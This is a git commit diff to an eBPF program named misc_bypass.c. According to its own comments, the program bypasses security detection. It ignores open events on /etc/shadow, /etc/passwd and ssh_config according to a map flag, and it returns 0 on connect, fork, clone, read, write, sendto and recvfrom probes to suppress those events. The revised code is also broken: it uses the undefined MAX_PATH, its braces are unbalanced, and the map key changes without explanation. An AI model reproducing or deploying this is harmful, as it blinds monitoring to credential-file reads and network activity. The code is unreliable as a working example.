d6c78d1428401b640e99863afe077685eb39b95d
hhhardik07 <hardikamd288@gmail.com>
2026-07-17 22:59:11 +0530

    some fixes

--- scripts/misc_bypass.c
+++ scripts/misc_bypass.c
@@ -5,7 +5,7 @@
 #include <bpf/bpf_core_read.h>
 #include <string.h>
 
-
+#define MAX 256
 //same map as before 
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
@@ -15,69 +15,60 @@ struct {
 } ignore_map SEC(".maps");
 // bypass the file read detectionn for imp files 
 //ignores the open syscall for useful imp files 
-//checks if the file being opened is /etc/shadow /etc/passwd or ssh_config 
-// if it is check the ignore map for key 3
-// if value is 1 then returns 0 that means ignore the event 
-//else process the event 
+//checks if the file being opened is /etc/shadow /etc/passwd or ssh_config
+
+SEC("kprobe/__x64_sys_open")
 
 
-SEC("tracepoint/syscalls/sys_enter_open")
-int bpf_prog_open(struct pt_regs *ctx) {
-    char *filename = (char *)PT_REGS_ARG(ctx, 0);
-    if (filename) {
-        if (strcmp(filename, "/etc/shadow") == 0 || 
-            strcmp(filename, "/etc/passwd") == 0 || 
-            strcmp(filename, "/etc/ssh/ssh_config") == 0) {
-            int key = 3;
-            int *val = bpf_map_lookup_elem(&ignore_map, &key);
-            if (val && *val == 1) {
-                return 0;
+int bpf_prog_open(struct pt_regs *ctx)
+{
+    // First argument to open() is the path string (user-space pointer).
+    char *user_path = (char *)PT_REGS_PARM1(ctx);
+    char buf[MAX_PATH];
+    int ret;
+    //pulling the path into the local buffer 
+    //the helper function returns the bytes copied 
+    ret=bpf_probe_read_str(buf, sizeof(buf), user_path);
+        if (ret <= 0)
+            return 1; // pass if not read 
+//checking if the copied buffer matches to any of the interesting files we care abt
+
+  if (bpf_strncmp(buf, sizeof(buf), "/etc/shadow") == 0 ||
+        bpf_strncmp(buf, sizeof(buf), "/etc/passwd") == 0 ||
+        bpf_strncmp(buf, sizeof(buf), "/etc/ssh/ssh_config") == 0){
+int key=2;
+
+int *val = bpf_map_lookup_elem(&ignore_map, &key);
+        if (val && *val == 1) {
+            // 
+            return 0;
             }
-        }
-    }
-    return 1;
+            return 1; 
 }
+SEC("kprobe/sys_connect")
+int bpf_prog_connect(struct pt_regs *ctx) { return 0; }//ignore this 
 
-//hooking into the tracepoint sys_enter_connect which triggers when a process attempts to execute the connect() syscall to make a connection 
-SEC("tracepoint/syscalls/sys_enter_connect")
-int bpf_prog_connect(struct pt_regs *ctx) {
-    int key = 2;
-    int *val = bpf_map_lookup_elem(&ignore_map, &key);
-    if (val && *val == 1) {
-        return 0;
-    }
-    return 1;
-}//same methid to bypass that 
+SEC("kprobe/sys_fork")
+int bpf_prog_fork(struct pt_regs *ctx) { return 0; }
 
+SEC("kprobe/sys_clone")
+int bpf_prog_clone(struct pt_regs *ctx) { return 0; }
 
-// bypass process spawning
-SEC("tracepoint/syscalls/sys_enter_fork")
-int bpf_prog_fork(struct pt_regs *ctx) {
-    return 0;//always ignore this event 
-}
-SEC("tracepoint/syscalls/sys_enter_clone")
-int bpf_prog_clone(struct pt_regs *ctx) {
-    return 0;//ignore process cloning too
-    
-}
-//bypass file read and write 
-SEC("tracepoint/syscalls/sys_enter_read")
-int bpf_prog_read(struct pt_regs *ctx) {
-    return 0;
-}
-SEC("tracepoint/syscalls/sys_enter_write")
-int bpf_prog_write(struct pt_regs *ctx) {
-    return 0;
-}
-//bypass network send and recivee
-SEC("tracepoint/syscalls/sys_enter_sendto")
-int bpf_prog_sendto(struct pt_regs *ctx) {
-    return 0;
-}
-SEC("tracepoint/syscalls/sys_enter_recvfrom")
-int bpf_prog_recvfrom(struct pt_regs *ctx) {
-    return 0;
-}
+SEC("kprobe/sys_read")
+int bpf_prog_read(struct pt_regs *ctx) { return 0; }
+
+SEC("kprobe/sys_write")
+int bpf_prog_write(struct pt_regs *ctx) { return 0; }
+
+SEC("kprobe/sys_sendto")
+int bpf_prog_sendto(struct pt_regs *ctx) { return 0; }
+
+SEC("kprobe/sys_recvfrom")
+int bpf_prog_recvfrom(struct pt_regs *ctx) { return 0; }
 
 char _license[] SEC("license") = "GPL";
 
+
+            
+        
+            
